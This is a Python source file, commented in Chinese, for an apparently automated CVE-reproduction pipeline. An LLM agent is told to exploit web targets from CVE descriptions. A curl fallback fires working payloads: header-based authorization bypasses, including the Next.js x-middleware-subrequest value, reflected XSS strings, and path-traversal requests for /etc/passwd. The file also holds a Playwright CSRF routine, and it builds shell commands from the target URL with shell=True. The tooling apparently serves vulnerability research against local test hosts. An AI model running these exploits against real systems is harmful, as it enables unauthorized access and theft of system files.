"""Playwright 特定的能力适配器（支持高级 Web 交互）。"""
from typing import Any, Dict
import subprocess
import os
from datetime import datetime

# ============================================================
# Capability 接口兼容的适配器
# ============================================================

class PlaywrightWebExploiterAdapter:
    """通用的 Web 漏洞利用适配器
    
    这个适配器符合 Capability 接口 (result_bus, config)，
    使用 LLM Agent (WebDriverAgent) 执行通用的 Web 漏洞利用。
    对于简单的 HTTP-based 漏洞，也支持直接使用 curl 测试。
    """
    
    def __init__(self, result_bus, config: dict):
        self.result_bus = result_bus
        self.config = config
    
    def execute(self, inputs: Dict[str, Any]) -> Dict[str, Any]:
        cve_knowledge = inputs.get('cve_knowledge', '')
        cve_id = inputs.get('cve_id', 'UNKNOWN')
        
        # 从 browser_config 获取 target_url
        browser_config = inputs.get('browser_config', {})
        if isinstance(browser_config, dict) and browser_config.get('target_url'):
            target_url = browser_config['target_url']
            print(f"[WebExploiter] ✅ Using target_url from browser_config: {target_url}")
        else:
            target_url = self.config.get('target_url', 'http://host.docker.internal:9600')
            print(f"[WebExploiter] ⚠️ No browser_config, using config/default: {target_url}")
        
        attack_type = self.config.get('attack_type', 'web')
        
        print(f"[WebExploiter] 🎯 Target: {target_url}")
        print(f"[WebExploiter] 📋 Attack Type: {attack_type}")
        print(f"[WebExploiter] 📋 CVE Knowledge: {cve_knowledge[:300]}..." if len(cve_knowledge) > 300 else f"[WebExploiter] 📋 CVE Knowledge: {cve_knowledge}")
        
        # 准备证据保存目录
        evidence_dir = f"/workspaces/submission/src/shared/{cve_id}/evidence"
        os.makedirs(evidence_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        exploit_result = {
            'success': False,
            'attack_type': attack_type,
            'target_url': target_url,
            'evidence': [],
            'error': None,
            'evidence_files': [],
            'method': 'llm-agent'  # 标记使用的方法
        }
        
        try:
            # 使用 WebDriverAgent (LLM Agent) 执行通用的漏洞利用
            # WebDriverAgent 会根据 cve_knowledge 自动推理攻击策略
            from agents.webDriverAgent import WebDriverAgent
            
            print(f"[WebExploiter] 🤖 Invoking WebDriverAgent (LLM-based exploitation)...")
            
            agent = WebDriverAgent(
                cve_knowledge=cve_knowledge,
                target_url=target_url,
                attack_type=attack_type
            )
            
            result = agent.invoke()
            agent_result = result.value if hasattr(result, 'value') else result
            
            print(f"[WebExploiter] 📤 Agent Result: {agent_result}")
            
            # 解析 Agent 结果
            if isinstance(agent_result, dict):
                success_value = agent_result.get('success', 'no')
                is_success = success_value in ['yes', 'true', True, 1, '1']
                exploit_result['success'] = is_success
                exploit_result['evidence'] = [
                    f"Exploit Steps: {agent_result.get('exploit', 'N/A')}",
                    f"Evidence: {agent_result.get('evidence', 'N/A')}",
                    f"PoC: {agent_result.get('poc', 'N/A')}"
                ]
                
                # 保存 Agent 输出到文件
                agent_output_file = f"{evidence_dir}/agent_output_{timestamp}.txt"
                with open(agent_output_file, 'w', encoding='utf-8') as f:
                    f.write(f"=== WebDriverAgent Output ===\n")
                    f.write(f"CVE: {cve_id}\n")
                    f.write(f"Target: {target_url}\n")
                    f.write(f"Attack Type: {attack_type}\n")
                    f.write(f"Time: {datetime.now().isoformat()}\n")
                    f.write(f"\n=== Result ===\n")
                    f.write(f"Success: {is_success}\n")
                    f.write(f"\n=== Exploit Steps ===\n")
                    f.write(str(agent_result.get('exploit', 'N/A')))
                    f.write(f"\n\n=== Evidence ===\n")
                    f.write(str(agent_result.get('evidence', 'N/A')))
                    f.write(f"\n\n=== PoC ===\n")
                    f.write(str(agent_result.get('poc', 'N/A')))
                exploit_result['evidence_files'].append(agent_output_file)
                
            else:
                # Agent 返回字符串，尝试解析
                exploit_result['evidence'] = [f"Agent output: {str(agent_result)[:500]}"]
            
            if exploit_result['success']:
                print(f"[WebExploiter] 🎉 Exploit successful!")
                
                # 生成汇总报告
                report_file = f"{evidence_dir}/exploit_report_{timestamp}.md"
                with open(report_file, 'w', encoding='utf-8') as f:
                    f.write(f"# {cve_id} 漏洞复现报告\n\n")
                    f.write(f"## 基本信息\n")
                    f.write(f"- **CVE ID**: {cve_id}\n")
                    f.write(f"- **攻击类型**: {attack_type}\n")
                    f.write(f"- **目标 URL**: {target_url}\n")
                    f.write(f"- **复现时间**: {datetime.now().isoformat()}\n\n")
                    f.write(f"## 复现结果: ✅ 成功\n\n")
                    f.write(f"## 证据\n")
                    for ev in exploit_result['evidence']:
                        f.write(f"- {ev}\n")
                exploit_result['evidence_files'].append(report_file)
                print(f"[WebExploiter] 📝 Report saved to: {report_file}")
            else:
                print(f"[WebExploiter] ⚠️ Exploit may have failed or result unclear")
                
        except ImportError as e:
            print(f"[WebExploiter] ⚠️ WebDriverAgent not available: {e}")
            print(f"[WebExploiter] 🔄 Falling back to HTTP-based testing...")
            
            # Fallback: 使用 HTTP 请求进行基本测试
            exploit_result = self._http_based_exploit(
                target_url, cve_knowledge, cve_id, attack_type, 
                evidence_dir, timestamp
            )
            
        except Exception as e:
            exploit_result['error'] = str(e)
            print(f"[WebExploiter] ❌ Error: {e}")
            
            # 尝试 HTTP fallback
            print(f"[WebExploiter] 🔄 Trying HTTP-based fallback...")
            try:
                exploit_result = self._http_based_exploit(
                    target_url, cve_knowledge, cve_id, attack_type,
                    evidence_dir, timestamp
                )
            except Exception as e2:
                exploit_result['error'] = f"Both methods failed: {e}, {e2}"
        
        return {'web_exploit_result': exploit_result}
    
    def _http_based_exploit(self, target_url: str, cve_knowledge: str, 
                            cve_id: str, attack_type: str,
                            evidence_dir: str, timestamp: str) -> Dict[str, Any]:
        """使用 HTTP 请求进行基本的漏洞测试（通用方法）
        
        这个方法会分析 cve_knowledge 来决定测试策略，而不是硬编码。
        """
        exploit_result = {
            'success': False,
            'attack_type': attack_type,
            'target_url': target_url,
            'evidence': [],
            'error': None,
            'evidence_files': [],
            'method': 'http-based'
        }
        
        print(f"[HTTPExploit] 🔍 Analyzing CVE knowledge to determine exploit strategy...")
        
        # 从 cve_knowledge 中提取关键信息来决定测试策略
        knowledge_lower = cve_knowledge.lower()
        
        # 1. 先测试目标是否可达
        print(f"[HTTPExploit] 📡 Testing target availability: {target_url}")
        test_cmd = f'curl -s -o /dev/null -w "%{{http_code}}" "{target_url}/" --max-time 10'
        test_result = subprocess.run(test_cmd, shell=True, capture_output=True, text=True, timeout=15)
        baseline_code = test_result.stdout.strip()
        print(f"[HTTPExploit] Baseline response: HTTP {baseline_code}")
        
        # 保存基线请求
        baseline_file = f"{evidence_dir}/baseline_request_{timestamp}.txt"
        baseline_cmd_full = f'curl -s -i "{target_url}/" --max-time 10'
        baseline_result = subprocess.run(baseline_cmd_full, shell=True, capture_output=True, text=True, timeout=15)
        with open(baseline_file, 'w', encoding='utf-8') as f:
            f.write(f"=== Baseline Request ===\n")
            f.write(f"URL: {target_url}/\n")
            f.write(f"Time: {datetime.now().isoformat()}\n")
            f.write(f"\n=== Response ===\n")
            f.write(baseline_result.stdout)
        exploit_result['evidence_files'].append(baseline_file)
        
        # 2. 根据漏洞类型/关键词选择测试策略
        tests_performed = []
        
        # 检测授权绕过类漏洞 (middleware, authorization, bypass, authentication)
        if any(kw in knowledge_lower for kw in ['middleware', 'authorization', 'bypass', 'authentication', 'auth']):
            print(f"[HTTPExploit] 🔐 Detected potential authorization bypass vulnerability")
            tests_performed.append("Authorization Bypass Tests")
            
            # 通用授权绕过 headers 测试
            bypass_headers = [
                ("X-Original-URL", "/admin"),
                ("X-Rewrite-URL", "/admin"),
                ("X-Forwarded-For", "127.0.0.1"),
                ("X-Remote-IP", "127.0.0.1"),
                ("X-Client-IP", "127.0.0.1"),
                ("X-Real-IP", "127.0.0.1"),
            ]
            
            # 如果提到 middleware subrequest (Next.js)
            if 'middleware' in knowledge_lower and 'subrequest' in knowledge_lower:
                bypass_headers.append(
                    ("x-middleware-subrequest", "middleware:middleware:middleware:middleware:middleware")
                )
            
            for header_name, header_value in bypass_headers:
                bypass_cmd = f'curl -s -o /dev/null -w "%{{http_code}}" -H "{header_name}: {header_value}" "{target_url}/" --max-time 10'
                bypass_result = subprocess.run(bypass_cmd, shell=True, capture_output=True, text=True, timeout=15)
                bypass_code = bypass_result.stdout.strip()
                
                # 如果绕过请求返回不同的成功状态码
                if bypass_code == "200" and baseline_code in ["307", "302", "301", "401", "403"]:
                    print(f"[HTTPExploit] 🎉 Bypass successful with header: {header_name}")
                    exploit_result['success'] = True
                    exploit_result['evidence'].append(f"Bypass with {header_name}: {header_value} -> HTTP {bypass_code}")
                    
                    # 获取绕过后的内容
                    content_cmd = f'curl -s -H "{header_name}: {header_value}" "{target_url}/" --max-time 10'
                    content_result = subprocess.run(content_cmd, shell=True, capture_output=True, text=True, timeout=15)
                    
                    bypass_file = f"{evidence_dir}/bypass_{header_name}_{timestamp}.txt"
                    with open(bypass_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== Bypass Request ===\n")
                        f.write(f"Header: {header_name}: {header_value}\n")
                        f.write(f"Response Code: {bypass_code}\n")
                        f.write(f"\n=== Content ===\n")
                        f.write(content_result.stdout[:2000])
                    exploit_result['evidence_files'].append(bypass_file)
                    break
        
        # 检测 XSS 类漏洞
        if any(kw in knowledge_lower for kw in ['xss', 'cross-site scripting', 'script injection']):
            print(f"[HTTPExploit] 🔴 Detected potential XSS vulnerability")
            tests_performed.append("XSS Tests")
            # XSS 测试需要浏览器，HTTP 方式只能检测反射
            xss_payloads = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
            ]
            for payload in xss_payloads:
                import urllib.parse
                encoded = urllib.parse.quote(payload)
                xss_cmd = f'curl -s "{target_url}/?q={encoded}" --max-time 10'
                xss_result = subprocess.run(xss_cmd, shell=True, capture_output=True, text=True, timeout=15)
                if payload in xss_result.stdout or '<script>' in xss_result.stdout:
                    exploit_result['success'] = True
                    exploit_result['evidence'].append(f"XSS reflected: {payload[:50]}")
                    break
        
        # 检测 SSRF 类漏洞
        if any(kw in knowledge_lower for kw in ['ssrf', 'server-side request']):
            print(f"[HTTPExploit] 🌐 Detected potential SSRF vulnerability")
            tests_performed.append("SSRF Tests")
        
        # 检测 SQL 注入
        if any(kw in knowledge_lower for kw in ['sql injection', 'sqli', 'sql']):
            print(f"[HTTPExploit] 💉 Detected potential SQL injection vulnerability")
            tests_performed.append("SQLi Tests")
        
        # 检测路径遍历
        if any(kw in knowledge_lower for kw in ['path traversal', 'lfi', 'directory traversal', 'local file']):
            print(f"[HTTPExploit] 📂 Detected potential path traversal vulnerability")
            tests_performed.append("Path Traversal Tests")
            lfi_payloads = ["../../../etc/passwd", "....//....//....//etc/passwd"]
            for payload in lfi_payloads:
                import urllib.parse
                encoded = urllib.parse.quote(payload)
                lfi_cmd = f'curl -s "{target_url}/?file={encoded}" --max-time 10'
                lfi_result = subprocess.run(lfi_cmd, shell=True, capture_output=True, text=True, timeout=15)
                if 'root:' in lfi_result.stdout or '/bin/bash' in lfi_result.stdout:
                    exploit_result['success'] = True
                    exploit_result['evidence'].append(f"LFI successful with: {payload}")
                    break
        
        exploit_result['evidence'].insert(0, f"Tests performed: {', '.join(tests_performed)}")
        exploit_result['evidence'].insert(1, f"Baseline HTTP: {baseline_code}")
        
        if exploit_result['success']:
            print(f"[HTTPExploit] 🎉 HTTP-based exploit successful!")
            # 生成报告
            report_file = f"{evidence_dir}/http_exploit_report_{timestamp}.md"
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write(f"# {cve_id} HTTP-based 漏洞复现报告\n\n")
                f.write(f"## 基本信息\n")
                f.write(f"- **CVE ID**: {cve_id}\n")
                f.write(f"- **目标 URL**: {target_url}\n")
                f.write(f"- **复现时间**: {datetime.now().isoformat()}\n\n")
                f.write(f"## 复现结果: ✅ 成功\n\n")
                f.write(f"## 测试详情\n")
                for ev in exploit_result['evidence']:
                    f.write(f"- {ev}\n")
            exploit_result['evidence_files'].append(report_file)
        else:
            print(f"[HTTPExploit] ⚠️ HTTP-based tests did not confirm vulnerability")
        
        return exploit_result


class PlaywrightVerifierAdapter:
    """PlaywrightVerifier 的 Capability 适配器"""
    
    def __init__(self, result_bus, config: dict):
        self.result_bus = result_bus
        self.config = config
    
    def execute(self, inputs: Dict[str, Any]) -> Dict[str, Any]:
        web_exploit_result = inputs.get('web_exploit_result', {})
        
        # 验证漏洞利用结果
        # 注意: DAG 的 success_condition 检查的是 'success' 字段
        is_success = web_exploit_result.get('success', False)
        verification = {
            'success': is_success,  # DAG 检查这个字段
            'passed': is_success,   # 兼容性
            'confidence': 1.0 if is_success else 0.0,
            'evidence': web_exploit_result.get('evidence', []),
            'method': 'playwright-http-verify'
        }
        
        if verification['success']:
            print(f"[PlaywrightVerifier] ✅ Verification PASSED")
        else:
            print(f"[PlaywrightVerifier] ❌ Verification FAILED")
        
        return {'verification_result': verification}


# ============================================================
# 原始 Playwright 类（用于真正的浏览器自动化场景）
# ============================================================

class PlaywrightWebExploiter:
    """使用 Playwright 执行 Web 漏洞利用（支持网络拦截等高级功能）。"""

    def __init__(self, page, cve_knowledge: str, target_url: str, attack_type: str = "csrf"):
        """
        Args:
            page: Playwright page 对象
            cve_knowledge: CVE 知识库内容
            target_url: 目标 URL
            attack_type: 攻击类型（csrf, xss, ssrf 等）
        """
        self.page = page
        self.cve_knowledge = cve_knowledge
        self.target_url = target_url
        self.attack_type = attack_type

    def execute_csrf_attack(self) -> Dict[str, Any]:
        """执行 CSRF 攻击（Playwright 版本）。"""
        # 导航到目标页面
        self.page.goto(self.target_url)
        
        # 示例：查找并点击敏感操作按钮
        try:
            # 可以使用更灵活的选择器
            button = self.page.query_selector("button.dangerous-action")
            if button:
                button.click()
                self.page.wait_for_load_state("networkidle")
                
                return {
                    "success": True,
                    "http_response": {
                        "status_code": 200,
                        "content": self.page.content(),
                    },
                    "cookies": self.page.context.cookies(),
                }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
            }

    def execute_with_network_interception(self) -> Dict[str, Any]:
        """使用网络拦截执行攻击（Playwright 特有能力）。"""
        captured_requests = []
        
        # 拦截所有请求
        def handle_route(route, request):
            captured_requests.append({
                "url": request.url,
                "method": request.method,
                "headers": request.headers,
            })
            # 可以修改请求或直接返回响应
            route.continue_()
        
        self.page.route("**/*", handle_route)
        
        # 执行攻击
        self.page.goto(self.target_url)
        
        # 等待网络空闲
        self.page.wait_for_load_state("networkidle")
        
        return {
            "success": True,
            "captured_requests": captured_requests,
            "page_content": self.page.content(),
        }


class PlaywrightVerifier:
    """使用 Playwright 进行高级验证（支持截图、录制等）。"""

    def __init__(self, page):
        self.page = page

    def verify_with_screenshot(self, output_path: str = "/tmp/exploit_result.png") -> Dict[str, Any]:
        """验证并保存截图证据。"""
        try:
            # 截图保存
            self.page.screenshot(path=output_path, full_page=True)
            
            # 检查页面状态
            title = self.page.title()
            url = self.page.url
            
            return {
                "success": True,
                "screenshot_path": output_path,
                "page_title": title,
                "current_url": url,
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
            }

    def verify_dom_mutation(self) -> Dict[str, Any]:
        """检测 DOM 变化（XSS 验证）。"""
        # 执行 JavaScript 检查 DOM
        has_malicious_script = self.page.evaluate("""
            () => {
                const scripts = document.querySelectorAll('script');
                for (let script of scripts) {
                    if (script.textContent.includes('alert') || 
                        script.textContent.includes('document.cookie')) {
                        return true;
                    }
                }
                return false;
            }
        """)
        
        return {
            "success": has_malicious_script,
            "confidence": 1.0 if has_malicious_script else 0.0,
            "evidence": "检测到恶意脚本注入" if has_malicious_script else "未发现 XSS",
        }


def build_playwright_adapters(page, context: Dict[str, Any]) -> Dict[str, Any]:
    """为 Playwright 构建专用适配器。"""
    cve_knowledge = context.get("cve_knowledge", "")
    target_url = context.get("target_url", "http://localhost:9600")
    attack_type = context.get("attack_type", "csrf")
    
    exploiter = PlaywrightWebExploiter(page, cve_knowledge, target_url, attack_type)
    verifier = PlaywrightVerifier(page)
    
    return {
        "exploiter": exploiter,
        "verifier": verifier,
    }
